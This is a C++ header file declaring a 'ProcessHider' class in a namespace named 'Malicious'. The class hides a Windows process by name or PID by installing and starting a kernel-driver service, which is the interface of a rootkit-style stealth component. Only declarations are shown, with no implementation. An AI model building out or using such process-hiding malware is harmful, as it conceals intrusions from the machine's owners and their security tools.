//!
//!     Kaleidoscalp, all rights reserved.
//!

#ifndef _PROCESS_HIDER_HPP_
#define _PROCESS_HIDER_HPP_

#include <string>
#include <exception>
#include <windows.h>
#include <winioctl.h>

namespace Malicious
{
    class ProcessHider
    {
        public:

            class DriverError : public std::exception
            {
                public:
                    DriverError();
            };

            ProcessHider();
            ~ProcessHider();
            void hide(const std::string& processName);
            void hide(unsigned long processPid);
            void remove();

        private:
            
            void installService();
            void removeService();
            void openServiceManager();
            void closeServiceManager();
            void openService();
            void closeService();
            void startService();
            void stopService();

            std::string driverPath;
            SC_HANDLE manager;
            SC_HANDLE service;
    };
    
} // Malicious

#endif // _PROCESS_HIDER_HPP_
